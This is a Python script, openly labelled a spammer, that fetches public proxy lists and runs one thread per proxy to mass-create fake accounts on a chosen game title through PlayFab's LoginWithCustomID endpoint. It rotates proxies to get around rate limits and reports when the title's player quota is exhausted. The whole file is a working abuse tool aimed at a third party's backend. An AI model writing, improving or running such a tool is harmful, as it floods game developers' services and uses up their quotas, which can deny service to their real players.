import requests
import random
import time
import threading
import colorama
from colorama import Fore, init
import os
import ast

# Initialize colorama
init(convert=True)

# Console messages
def error(msg): 
    print(f"{Fore.WHITE}[{Fore.RED}ERROR{Fore.WHITE}]{Fore.RESET} {msg}")

def success(msg): 
    print(f"{Fore.WHITE}[{Fore.GREEN}SUCCESS{Fore.WHITE}]{Fore.RESET} {msg}")

def console(msg): 
    print(f"{Fore.WHITE}[{Fore.BLUE}CONSOLE{Fore.WHITE}]{Fore.RESET} {msg}")

console("LOADING MODULES AND ASSETS")

# Get proxies from the API
console("Getting Proxies")
url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
proxget = requests.get(url=url)
proxlist = proxget.text.splitlines()
console("Found Proxies")

spamming = False
accpersec = 0
threadsready = False
workingproxies = 0

# Function to cache proxies
def cache_proxies(proxies):
    with open("cache_proxies.txt", "w") as w:
        w.write(str(proxies))

# Function to read cached proxies
def read_cached_proxies():
    if os.path.exists("cache_proxies.txt"):
        with open("cache_proxies.txt", "r") as readFile:
            proxies = readFile.read()
            return ast.literal_eval(proxies)
    return []

# Load cached proxies if available
cache_proxlist = read_cached_proxies()

# Function to get proxy from list
def get_http_proxy(index):
    return proxlist[index]

def get_cached_proxy(index):
    return cache_proxlist[index]

# Main spam function
def spamPlayfab(titleID, prefix, spamProxy, useCache):
    global workingproxies, accpersec, threadsready

    while threadsready:
        playfabAPIRoute = f"https://{titleID}.playfabapi.com/Client/LoginWithCustomID"
        cid = f"{prefix}{random.randint(0, 999999)}"
        payload = {
            "TitleId": titleID,
            "CreateAccount": True,
            "CustomId": cid
        }

        proxies = {
            "http": spamProxy,
            "https": spamProxy
        }

        try:
            response = requests.post(url=playfabAPIRoute, json=payload, proxies=proxies)
            responseJson = response.json()

            if responseJson['code'] == 200:
                success(f"ACCOUNT CREATED: {responseJson['data']['EntityToken']['Entity']['Id']} WITH CUSTOM ID: {cid}")
                accpersec += 1
            elif responseJson['code'] == 429:
                error(f"{spamProxy} has been rate limited or Playfab storage is full.")
            elif 'error' in responseJson and responseJson['error'] == 'EvaluationModePlayerCountExceeded':
                error("Playfab is full.")
            else:
                error(f"Unexpected error: {responseJson}")
            
        except Exception as e:
            error(f"Proxy error with {spamProxy}: {e}")
            if useCache:
                if spamProxy in cache_proxlist:
                    cache_proxlist.remove(spamProxy)
                    cache_proxies(cache_proxlist)
            else:
                if spamProxy in proxlist:
                    proxlist.remove(spamProxy)
                    cache_proxies(proxlist)
            workingproxies -= 1
            break

        time.sleep(0.35)

# Main function to initialize threads
def main(titleid, prefix, useCache):
    global workingproxies, threadsready

    spamThreads = []
    proxies = cache_proxlist if useCache else proxlist
    workingproxies = len(proxies)
    
    console(f"Got {workingproxies} proxies")
    console("Making Threads")

    for i, proxy in enumerate(proxies):
        spamThreads.append(threading.Thread(target=spamPlayfab, args=(titleid, prefix, proxy, useCache)))

    console("Starting Threads")
    threadsready = True
    for thread in spamThreads:
        console(f"Thread Started: {thread}")
        thread.start()

    success("All threads ready!")

# ASCII Art
spammerscrim = """
    ░▒▓███████▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒
    ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
    ░▒▓██████▓▒░ ░▒▓██████▓▒░░▒▓█▓▒░      ░▒▓█▓▒░░▒▓██████▓▒░  
"""

os.system('cls' if os.name == 'nt' else 'clear')
print(spammerscrim)

# Main entry point
titleid = input(f"{Fore.WHITE}[{Fore.BLUE}CONSOLE{Fore.WHITE}]{Fore.RESET} Title ID TO Spam: ")
prefix = input(f"{Fore.WHITE}[{Fore.BLUE}CONSOLE{Fore.WHITE}]{Fore.RESET} Custom ID: ")
use_cache = False

main(titleid, prefix, use_cache)
spamming = True
